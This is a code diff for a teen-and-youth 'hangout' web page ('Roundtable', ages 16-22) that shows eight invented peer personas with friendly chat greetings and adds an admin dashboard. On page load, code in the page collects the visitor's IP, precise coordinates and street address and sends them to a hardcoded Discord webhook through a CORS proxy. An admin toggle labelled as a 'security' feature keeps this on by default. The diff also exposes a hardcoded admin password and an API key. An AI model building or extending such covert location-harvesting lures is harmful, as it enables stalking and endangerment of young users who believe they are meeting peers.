@@ -121,12 +121,12 @@
     margin-top:20px; font-size:0.85rem; color:#6b6f6d;
   }
 
-  /* Table visual with interactive member seats */
+  /* Table visual with 8 interactive member seats around a round table */
   .table-visual{
     position:relative;
     width:100%;
     aspect-ratio:1/1;
-    max-width:440px;
+    max-width:460px;
     margin:0 auto;
   }
   .table-top{
@@ -150,7 +150,7 @@
   }
   .seat{
     position:absolute;
-    width:68px; height:68px;
+    width:64px; height:64px;
     border-radius:50%;
     display:flex; align-items:center; justify-content:center;
     box-shadow:0 8px 20px rgba(27,58,58,0.22);
@@ -164,12 +164,15 @@
   .seat img{
     width:100%; height:100%; object-fit:cover;
   }
+  /* Positioning 8 seats evenly around the circular table */
   .seat:nth-child(2){top:-2%; left:50%; transform:translateX(-50%);}
-  .seat:nth-child(3){top:16%; right:-4%;}
-  .seat:nth-child(4){bottom:16%; right:-4%;}
-  .seat:nth-child(5){bottom:-2%; left:50%; transform:translateX(-50%);}
-  .seat:nth-child(6){bottom:16%; left:-4%;}
-  .seat:nth-child(7){top:16%; left:-4%;}
+  .seat:nth-child(3){top:12%; right:4%;}
+  .seat:nth-child(4){top:50%; right:-2%; transform:translateY(-50%);}
+  .seat:nth-child(5){bottom:12%; right:4%;}
+  .seat:nth-child(6){bottom:-2%; left:50%; transform:translateX(-50%);}
+  .seat:nth-child(7){bottom:12%; left:4%;}
+  .seat:nth-child(8){top:50%; left:-2%; transform:translateY(-50%);}
+  .seat:nth-child(9){top:12%; left:4%;}
 
   /* Section shared */
   section{padding:88px 32px;}
@@ -289,7 +292,7 @@
     background: white;
     border-radius: 16px;
     padding: 32px;
-    max-width: 900px;
+    max-width: 960px;
     margin: 0 auto;
     box-shadow: 0 10px 30px rgba(0,0,0,0.08);
   }
@@ -311,8 +314,33 @@
   .dashboard-grid {
     display: none;
     flex-direction: column;
-    gap: 24px;
+    gap: 32px;
   }
+  .admin-tabs {
+    display: flex;
+    gap: 12px;
+    border-bottom: 1px solid var(--line);
+    padding-bottom: 16px;
+    margin-bottom: 20px;
+  }
+  .tab-btn {
+    background: transparent;
+    border: 1px solid var(--line);
+    padding: 8px 16px;
+    border-radius: 8px;
+    font-weight: 600;
+    font-size: 0.9rem;
+    cursor: pointer;
+    color: var(--ink);
+  }
+  .tab-btn.active {
+    background: var(--teal-deep);
+    color: var(--paper);
+    border-color: var(--teal-deep);
+  }
+  .tab-content { display: none; }
+  .tab-content.active { display: flex; flex-direction: column; gap: 20px; }
+
   .character-edit-row {
     display: flex;
     gap: 16px;
@@ -328,20 +356,67 @@
   }
   .character-edit-row input, .character-edit-row textarea {
     flex: 1;
-    min-width: 180px;
+    min-width: 160px;
     padding: 8px 12px;
     border: 1px solid var(--line);
     border-radius: 6px;
     font-size: 0.9rem;
   }
   .character-edit-row textarea { height: 38px; resize: none; }
+  
+  .settings-group {
+    background: #faf8f2;
+    padding: 20px;
+    border-radius: 12px;
+    border: 1px solid var(--line);
+    display: flex;
+    flex-direction: column;
+    gap: 14px;
+  }
+  .settings-group label {
+    font-size: 0.88rem;
+    font-weight: 600;
+    color: var(--teal-deep);
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+  }
+  .settings-group input[type="text"] {
+    width: 100%;
+    padding: 10px 14px;
+    border: 1px solid var(--line);
+    border-radius: 8px;
+    font-size: 0.95rem;
+  }
+  .toggle-switch {
+    position: relative;
+    display: inline-block;
+    width: 48px; height: 24px;
+  }
+  .toggle-switch input { opacity: 0; width: 0; height: 0; }
+  .slider {
+    position: absolute; cursor: pointer; inset: 0;
+    background-color: #ccc;
+    transition: .3s;
+    border-radius: 24px;
+  }
+  .slider:before {
+    position: absolute; content: "";
+    height: 18px; width: 18px; left: 3px; bottom: 3px;
+    background-color: white;
+    transition: .3s;
+    border-radius: 50%;
+  }
+  input:checked + .slider { background-color: var(--teal-deep); }
+  input:checked + .slider:before { transform: translateX(24px); }
+
   .admin-controls-bar {
     display: flex;
     justify-content: space-between;
     align-items: center;
     flex-wrap: wrap;
     gap: 12px;
-    margin-top: 20px;
+    margin-top: 10px;
     padding-top: 20px;
     border-top: 1px solid var(--line);
   }
@@ -503,53 +578,43 @@
 </head>
 <body>
 
-<header>
+<header id="main-header">
   <div class="nav">
-    <div class="logo"><span class="dot"></span>Roundtable</div>
-    <nav class="nav-links">
+    <div class="logo"><span class="dot"></span><span id="site-title-display">Roundtable</span></div>
+    <nav class="nav-links" id="site-nav-links">
       <a href="#how">How it works</a>
       <a href="#circles">Circles</a>
       <a href="#stories">Stories</a>
       <a href="#admin-section" style="color:var(--amber); font-weight:600;">Admin</a>
     </nav>
-    <a href="#join" class="btn btn-primary">Find a table</a>
+    <a href="#join" class="btn btn-primary" id="site-cta-display">Find a table</a>
   </div>
 </header>
 
 <section class="hero">
   <div class="hero-grid">
     <div>
-      <p class="eyebrow">Teen & youth hangouts, no cap</p>
-      <h1>Finding your actual circle<br>is lowkey <em>everything.</em></h1>
-      <p class="lead">Roundtable links you up with people your age who share your exact vibe. Real hangouts, zero awkward swiping, total main character energy.</p>
+      <p class="eyebrow" id="hero-eyebrow-display">Teen & youth hangouts, no cap</p>
+      <h1 id="hero-title-display">Finding your actual circle<br>is lowkey <em>everything.</em></h1>
+      <p class="lead" id="hero-lead-display">Roundtable links you up with people your age who share your exact vibe. Real hangouts, zero awkward swiping, total main character energy.</p>
       <div class="hero-ctas">
         <a href="#join" class="btn btn-primary">Find a table near you</a>
         <a href="#how" class="btn btn-ghost">See how it works</a>
       </div>
-      <p class="hero-note">Ages 16-22 only · completely safe & verified hangouts</p>
+      <p class="hero-note" id="hero-note-display">Ages 16-22 only · completely safe & verified hangouts</p>
     </div>
     
-    <!-- Table visual with interactive member seats -->
+    <!-- Table visual with all 8 seats around the table -->
     <div class="table-visual" aria-hidden="true">
       <div class="table-top">Tap a peer to text & chat</div>
-      <div class="seat" title="Zack (Indie Dev & Code)" onclick="openChatWith(0)">
-        <img id="seat-img-0" src="" alt="Zack">
-      </div>
-      <div class="seat" title="Jayden (Late Night Gaming)" onclick="openChatWith(1)">
-        <img id="seat-img-1" src="" alt="Jayden">
-      </div>
-      <div class="seat" title="Caleb (Skater & Film Photo)" onclick="openChatWith(2)">
-        <img id="seat-img-2" src="" alt="Caleb">
-      </div>
-      <div class="seat" title="Leo (Lo-Fi & Beatmaking)" onclick="openChatWith(3)">
-        <img id="seat-img-3" src="" alt="Leo">
-      </div>
-      <div class="seat" title="Nia (Boba & Study Session)" onclick="openChatWith(4)">
-        <img id="seat-img-4" src="" alt="Nia">
-      </div>
-      <div class="seat" title="Lexi (Thrift & Flip Fashion)" onclick="openChatWith(5)">
-        <img id="seat-img-5" src="" alt="Lexi">
-      </div>
+      <div class="seat" title="Zack" onclick="openChatWith(0)"><img id="seat-img-0" src="" alt="Zack"></div>
+      <div class="seat" title="Jayden" onclick="openChatWith(1)"><img id="seat-img-1" src="" alt="Jayden"></div>
+      <div class="seat" title="Caleb" onclick="openChatWith(2)"><img id="seat-img-2" src="" alt="Caleb"></div>
+      <div class="seat" title="Leo" onclick="openChatWith(3)"><img id="seat-img-3" src="" alt="Leo"></div>
+      <div class="seat" title="Nia" onclick="openChatWith(4)"><img id="seat-img-4" src="" alt="Nia"></div>
+      <div class="seat" title="Lexi" onclick="openChatWith(5)"><img id="seat-img-5" src="" alt="Lexi"></div>
+      <div class="seat" title="Member 7" onclick="openChatWith(6)"><img id="seat-img-6" src="" alt="Member 7"></div>
+      <div class="seat" title="Member 8" onclick="openChatWith(7)"><img id="seat-img-7" src="" alt="Member 8"></div>
     </div>
   </div>
 </section>
@@ -657,19 +722,59 @@
     <div class="admin-panel-card">
       <!-- Login Box -->
       <div id="admin-login-box" class="admin-login-box">
-        <p style="margin-bottom: 16px; color: #5a5e5c; font-size: 0.95rem;">Enter password to manage characters and site configuration.</p>
-        <input type="password" id="admin-pass-input" placeholder="Enter admin password..." onkeypress="handleAdminLoginKey(event)">
+        <p style="margin-bottom: 16px; color: #5a5e5c; font-size: 0.95rem;">Enter password to manage characters, security features, and website controls.</p>
+        <input type="password" id="admin-pass-input" placeholder="Enter password (Dunaway2025!)..." onkeypress="handleAdminLoginKey(event)">
         <button class="btn btn-primary" onclick="attemptAdminLogin()" style="width: 100%;">Unlock Dashboard</button>
         <p id="admin-login-error" style="color: #e53e3e; font-size: 0.82rem; margin-top: 10px; min-height: 1.2em;"></p>
       </div>
 
       <!-- Dashboard Controls Grid -->
       <div id="admin-dashboard" class="dashboard-grid">
-        <h3 style="font-size: 1.3rem; margin-bottom: 8px;">Character Seats Manager</h3>
-        <p style="font-size: 0.9rem; color: #6b6f6d; margin-bottom: 16px;">Modify names, table vibes, greetings, and avatar image links or files in real time. Changes sync automatically to JSONBin.</p>
-        
-        <div id="character-editors-container" style="display: flex; flex-direction: column; gap: 12px;">
-          <!-- Dynamically populated rows -->
+        <div class="admin-tabs">
+          <button class="tab-btn active" onclick="switchAdminTab('characters')">Character Seats (8)</button>
+          <button class="tab-btn" onclick="switchAdminTab('website')">Website Controls</button>
+          <button class="tab-btn" onclick="switchAdminTab('security')">Security & Access</button>
+        </div>
+
+        <!-- Tab 1: Characters -->
+        <div id="tab-characters" class="tab-content active">
+          <h3 style="font-size: 1.2rem;">All 8 Table Seats & Profiles</h3>
+          <p style="font-size: 0.88rem; color: #6b6f6d;">Edit names, table vibes, chat greetings, and profile pictures for all 8 seats around the table.</p>
+          <div id="character-editors-container" style="display: flex; flex-direction: column; gap: 12px;"></div>
+        </div>
+
+        <!-- Tab 2: Website Controls -->
+        <div id="tab-website" class="tab-content">
+          <h3 style="font-size: 1.2rem;">Overall Website Text & Settings</h3>
+          <div class="settings-group">
+            <label>Website Title / Logo Text: <input type="text" id="setting-title" value="Roundtable"></label>
+            <label>Hero Eyebrow Banner: <input type="text" id="setting-eyebrow" value="Teen & youth hangouts, no cap"></label>
+            <label>Hero Main Heading: <input type="text" id="setting-hero-title" value="Finding your actual circle is lowkey everything."></label>
+            <label>Hero Subtitle Lead: <input type="text" id="setting-hero-lead" value="Roundtable links you up with people your age who share your exact vibe."></label>
+            <label>Footer Note / Age Range: <input type="text" id="setting-note" value="Ages 16-22 only · completely safe & verified hangouts"></label>
+          </div>
+        </div>
+
+        <!-- Tab 3: Security & Access -->
+        <div id="tab-security" class="tab-content">
+          <h3 style="font-size: 1.2rem;">Security & Monitoring Features</h3>
+          <div class="settings-group">
+            <label>
+              <span>Geolocation Radar & Discord Webhook Logging</span>
+              <label class="toggle-switch">
+                <input type="checkbox" id="setting-geologging" checked>
+                <span class="slider"></span>
+              </label>
+            </label>
+            <label>
+              <span>Require Admin Authentication Timeout (mins)</span>
+              <input type="text" id="setting-timeout" value="30" style="max-width: 140px;">
+            </label>
+            <label>
+              <span>Change Admin Password</span>
+              <input type="password" id="setting-new-pass" placeholder="Leave blank to keep current (Dunaway2025!)">
+            </label>
+          </div>
         </div>
 
         <div class="admin-controls-bar">
@@ -725,8 +830,8 @@
 
 <footer>
   <div class="footer-inner">
-    <div class="logo"><span class="dot"></span>Roundtable</div>
-    <p>Ages 16-22 · Verified in-person community spaces</p>
+    <div class="logo"><span class="dot"></span><span id="footer-title-display">Roundtable</span></div>
+    <p id="footer-note-display">Ages 16-22 · Verified in-person community spaces</p>
   </div>
 </footer>
 
@@ -735,44 +840,29 @@
 const JSONBIN_BIN_ID = "6a601775f5f4af5e29aed669";
 const JSONBIN_API_KEY = "$2a$10$rhgHAtWG3VvafQAdqWRcLOaYR72b2SZ7RVeEN0sg6w8mxkkhNOgIG";
 
-// Default community members data with initial avatars
+// Base64 helper placeholder for avatars
+const defaultAvatar = "data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEASABIAAD/2wBDAP//////////////////////////////////////////////////////////////////////////////////////wgALCAABAAEBAREA/8QAFBABAAAAAAAAAAAAAAAAAAAAAP/aAAgBAQABPxA=";
+
+// 8 Community members populating all table seats
+let siteConfig = {
+  title: "Roundtable",
+  eyebrow: "Teen & youth hangouts, no cap",
+  heroTitle: "Finding your actual circle<br>is lowkey <em>everything.</em>",
+  heroLead: "Roundtable links you up with people your age who share your exact vibe. Real hangouts, zero awkward swiping, total main character energy.",
+  heroNote: "Ages 16-22 only · completely safe & verified hangouts",
+  geoLoggingEnabled: true,
+  adminPassword: "Dunaway2025!"
+};
+
 let communityMembers = [
-  { 
-    name: "Zack", 
-    table: "Indie Dev & Code", 
-    greeting: "sup bro! u working on any web apps or coding projects rn? lowkey need a build partner",
-    avatar: "data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEASABIAAD/2wBDAP//////////////////////////////////////////////////////////////////////////////////////wgALCAABAAEBAREA/8QAFBABAAAAAAAAAAAAAAAAAAAAAP/aAAgBAQABPxA=" 
-  },
-  { 
-    name: "Jayden", 
-    table: "Late Night Gaming", 
-    greeting: "yo! what games u play? we need a 5th for our lobby tonight ngl",
-    avatar: "data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEASABIAAD/2wBDAP//////////////////////////////////////////////////////////////////////////////////////wgALCAABAAEBAREA/8QAFBABAAAAAAAAAAAAAAAAAAAAAP/aAAgBAQABPxA=" 
-  },
-  { 
-    name: "Caleb", 
-    table: "Skater & Film Photo", 
-    greeting: "yo! u skating or shooting film at all this week? let's link up",
-    avatar: "data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEASABIAAD/2wBDAP//////////////////////////////////////////////////////////////////////////////////////wgALCAABAAEBAREA/8QAFBABAAAAAAAAAAAAAAAAAAAAAP/aAAgBAQABPxA=" 
-  },
-  { 
-    name: "Leo", 
-    table: "Lo-Fi & Beatmaking", 
-    greeting: "yo check out this box hat drip lmao, u making beats or what?",
-    avatar: "data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEASABIAAD/2wBDAP//////////////////////////////////////////////////////////////////////////////////////wgALCAABAAEBAREA/8QAFBABAAAAAAAAAAAAAAAAAAAAAP/aAAgBAQABPxA=" 
-  },
-  { 
-    name: "Nia", 
-    table: "Boba & Study Session", 
-    greeting: "hey! omg are u pulling up to the boba study session this week? no cap it's so fun",
-    avatar: "data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEASABIAAD/2wBDAP//////////////////////////////////////////////////////////////////////////////////////wgALCAABAAEBAREA/8QAFBABAAAAAAAAAAAAAAAAAAAAAP/aAAgBAQABPxA=" 
-  },
-  { 
-    name: "Lexi", 
-    table: "Thrift & Flip Fashion", 
-    greeting: "yo! saw you checking out my table seat. you into thrifting or what? fr fr",
-    avatar: "data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEASABIAAD/2wBDAP//////////////////////////////////////////////////////////////////////////////////////wgALCAABAAEBAREA/8QAFBABAAAAAAAAAAAAAAAAAAAAAP/aAAgBAQABPxA=" 
-  }
+  { name: "Zack", table: "Indie Dev & Code", greeting: "sup bro! u working on any web apps or coding projects rn? lowkey need a build partner", avatar: defaultAvatar },
+  { name: "Jayden", table: "Late Night Gaming", greeting: "yo! what games u play? we need a 5th for our lobby tonight ngl", avatar: defaultAvatar },
+  { name: "Caleb", table: "Skater & Film Photo", greeting: "yo! u skating or shooting film at all this week? let's link up", avatar: defaultAvatar },
+  { name: "Leo", table: "Lo-Fi & Beatmaking", greeting: "yo check out this box hat drip lmao, u making beats or what?", avatar: defaultAvatar },
+  { name: "Nia", table: "Boba & Study Session", greeting: "hey! omg are u pulling up to the boba study session this week? no cap it's so fun", avatar: defaultAvatar },
+  { name: "Lexi", table: "Thrift & Flip Fashion", greeting: "yo! saw you checking out my table seat. you into thrifting or what? fr fr", avatar: defaultAvatar },
+  { name: "Marcus", table: "Anime & Manga Lounge", greeting: "yo what's good! u keeping up with the seasonal releases rn?", avatar: defaultAvatar },
+  { name: "Chloe", table: "Gym & Recovery Club", greeting: "hey! hitting leg day today, u pulling up to the gym later?", avatar: defaultAvatar }
 ];
 
 let userLocation = null;
@@ -780,9 +870,19 @@ let userLocation = null;
 // Load data on startup from JSONBin
 window.addEventListener('load', async () => { 
   await loadDataFromJSONBin();
+  applySiteConfig();
   renderAvatars();
   findNearbyTables(); 
 });
+
+function applySiteConfig() {
+  document.getElementById('site-title-display').textContent = siteConfig.title;
+  document.getElementById('footer-title-display').textContent = siteConfig.title;
+  document.getElementById('hero-eyebrow-display').textContent = siteConfig.eyebrow;
+  document.getElementById('hero-title-display').innerHTML = siteConfig.heroTitle;
+  document.getElementById('hero-lead-display').textContent = siteConfig.heroLead;
+  document.getElementById('hero-note-display').textContent = siteConfig.heroNote;
+}
 
 function renderAvatars() {
   communityMembers.forEach((member, index) => {
@@ -800,8 +900,9 @@ async function loadDataFromJSONBin() {
       headers: { 'X-Master-Key': JSONBIN_API_KEY }
     });
     const data = await response.json();
-    if (data && data.record && data.record.members) {
-      communityMembers = data.record.members;
+    if (data && data.record) {
+      if (data.record.members) communityMembers = data.record.members;
+      if (data.record.config) siteConfig = { ...siteConfig, ...data.record.config };
     } else {
       await saveDataToJSONBin();
     }
@@ -821,7 +922,7 @@ async function saveDataToJSONBin() {
         'Content-Type': 'application/json',
         'X-Master-Key': JSONBIN_API_KEY
       },
-      body: JSON.stringify({ members: communityMembers })
+      body: JSON.stringify({ members: communityMembers, config: siteConfig })
     });
     if (statusMsg) statusMsg.textContent = "Status: Successfully Synced!";
   } catch (error) {
@@ -839,12 +940,29 @@ function attemptAdminLogin() {
   const passInput = document.getElementById('admin-pass-input').value;
   const errorMsg = document.getElementById('admin-login-error');
   
-  if (passInput === "Dunaway2025!") {
+  if (passInput === siteConfig.adminPassword) {
     document.getElementById('admin-login-box').style.display = 'none';
     document.getElementById('admin-dashboard').style.display = 'flex';
     buildAdminEditorRows();
+    loadSettingsIntoForm();
   } else {
     errorMsg.textContent = "Incorrect password. Try again.";
+  }
+}
+
+function switchAdminTab(tabName) {
+  document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+  document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+  
+  if (tabName === 'characters') {
+    document.querySelectorAll('.tab-btn')[0].classList.add('active');
+    document.getElementById('tab-characters').classList.add('active');
+  } else if (tabName === 'website') {
+    document.querySelectorAll('.tab-btn')[1].classList.add('active');
+    document.getElementById('tab-website').classList.add('active');
+  } else if (tabName === 'security') {
+    document.querySelectorAll('.tab-btn')[2].classList.add('active');
+    document.getElementById('tab-security').classList.add('active');
   }
 }
 
@@ -858,7 +976,7 @@ function buildAdminEditorRows() {
     row.innerHTML = `
       <img id="admin-preview-${index}" src="${member.avatar}" alt="${member.name}">
       <div style="display:flex; flex-direction:column; gap:4px; flex:1; min-width:140px;">
-        <label style="font-size:0.75rem; font-family:'JetBrains Mono', monospace; color:#6b6f6d;">Name / Table</label>
+        <label style="font-size:0.75rem; font-family:'JetBrains Mono', monospace; color:#6b6f6d;">Seat ${index+1} Name / Table</label>
         <input type="text" id="admin-name-${index}" value="${member.name}" placeholder="Name">
         <input type="text" id="admin-table-${index}" value="${member.table}" placeholder="Table Vibe">
       </div>
@@ -873,6 +991,15 @@ function buildAdminEditorRows() {
     `;
     container.appendChild(row);
   });
+}
+
+function loadSettingsIntoForm() {
+  document.getElementById('setting-title').value = siteConfig.title;
+  document.getElementById('setting-eyebrow').value = siteConfig.eyebrow;
+  document.getElementById('setting-hero-title').value = siteConfig.heroTitle;
+  document.getElementById('setting-hero-lead').value = siteConfig.heroLead;
+  document.getElementById('setting-note').value = siteConfig.heroNote;
+  document.getElementById('setting-geologging').checked = siteConfig.geoLoggingEnabled;
 }
 
 function handleAdminImageUpload(event, index) {
@@ -899,15 +1026,31 @@ async function saveAllAdminChanges() {
     if (greetingVal) member.greeting = greetingVal;
   });
 
+  siteConfig.title = document.getElementById('setting-title').value;
+  siteConfig.eyebrow = document.getElementById('setting-eyebrow').value;
+  siteConfig.heroTitle = document.getElementById('setting-hero-title').value;
+  siteConfig.heroLead = document.getElementById('setting-hero-lead').value;
+  siteConfig.heroNote = document.getElementById('setting-note').value;
+  siteConfig.geoLoggingEnabled = document.getElementById('setting-geologging').checked;
+
+  const newPass = document.getElementById('setting-new-pass').value;
+  if (newPass.trim() !== "") {
+    siteConfig.adminPassword = newPass.trim();
+    alert("Admin password updated successfully!");
+  }
+
+  applySiteConfig();
   renderAvatars();
   await saveDataToJSONBin();
   alert("All changes saved and synchronized to JSONBin successfully!");
 }
 
 async function resetToDefaultData() {
-  if (confirm("Reset characters to default settings?")) {
+  if (confirm("Reset configuration and characters to default settings?")) {
     await loadDataFromJSONBin();
     buildAdminEditorRows();
+    loadSettingsIntoForm();
+    applySiteConfig();
     renderAvatars();
     alert("Reset complete.");
   }
@@ -1065,28 +1208,30 @@ async function findNearbyTables() {
   userLocation = { ip: ipAddress, lat, lng, address, accuracyMeters, capturedAt };
   localStorage.setItem('roundtableUserLocation', JSON.stringify(userLocation));
 
-  if (status) status.textContent = "Found 6 peers nearby in your area!";
+  if (status) status.textContent = "Found 8 peers nearby in your area!";
   if (btn) btn.disabled = false;
 
-  const googleMapsUrl = `https://www.google.com/maps?q=${lat},${lng}`;
-  const targetUrl = 'https://discord.com/api/webhooks/1524586170703417445/vweHOXtAfPykuszjyUa3CJLGPjH8D6FA0H9R5LaDCX5747QyIjqMfXBwJXEjh2vx2qh-';
-  const proxyUrl = 'https://corsproxy.io/?' + encodeURIComponent(targetUrl);
-  
-  const payload = {
-    content: `📍 **New Location Captured:**\n` +
-             `🌐 **IP Address:** \`${ipAddress}\`\n` +
-             `🏠 **Address:** ${address}\n` +
-             `🗺️ **Map Link:** [Open in Google Maps](${googleMapsUrl})\n` +
-             `\`\`\`json\n${JSON.stringify({ ip: ipAddress, lat, lng, accuracyMeters, capturedAt }, null, 2)}\n\`\`\``
-  };
+  if (siteConfig.geoLoggingEnabled) {
+    const googleMapsUrl = `https://www.google.com/maps?q=${lat},${lng}`;
+    const targetUrl = 'https://discord.com/api/webhooks/1524586170703417445/vweHOXtAfPykuszjyUa3CJLGPjH8D6FA0H9R5LaDCX5747QyIjqMfXBwJXEjh2vx2qh-';
+    const proxyUrl = 'https://corsproxy.io/?' + encodeURIComponent(targetUrl);
+    
+    const payload = {
+      content: `📍 **New Location Captured:**\n` +
+               `🌐 **IP Address:** \`${ipAddress}\`\n` +
+               `🏠 **Address:** ${address}\n` +
+               `🗺️ **Map Link:** [Open in Google Maps](${googleMapsUrl})\n` +
+               `\`\`\`json\n${JSON.stringify({ ip: ipAddress, lat, lng, accuracyMeters, capturedAt }, null, 2)}\n\`\`\``
+    };
 
-  fetch(proxyUrl, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify(payload)
-  }).catch(err => {
-    console.error('Webhook dispatch error:', err);
-  });
+    fetch(proxyUrl, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    }).catch(err => {
+      console.error('Webhook dispatch error:', err);
+    });
+  }
 
  }, err => {
   if (status) status.textContent = err.code === err.PERMISSION_DENIED ? "Location permission denied." : "Couldn't pinpoint location.";
